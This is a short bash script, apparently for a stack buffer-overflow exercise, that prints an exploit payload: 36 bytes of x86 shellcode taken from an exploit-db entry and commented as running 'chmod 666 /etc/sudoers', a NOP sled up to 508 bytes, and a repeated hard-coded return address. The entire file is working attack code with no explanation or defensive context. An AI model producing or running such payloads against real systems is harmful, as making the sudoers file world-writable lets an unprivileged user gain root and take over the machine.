#!/bin/bash

#https://www.exploit-db.com/exploits/43463/
#36 bytes
#chmod 666 /etc/sudoers

echo -ne "\x31\xd2\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\xff\x01\x31\xc0\xb0\x0f\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
for i in $(seq 37 508)
do
   echo -ne "\x90"
done

for i in 1 2
do
    echo -ne "\x1c\xd4\xff\xff"
done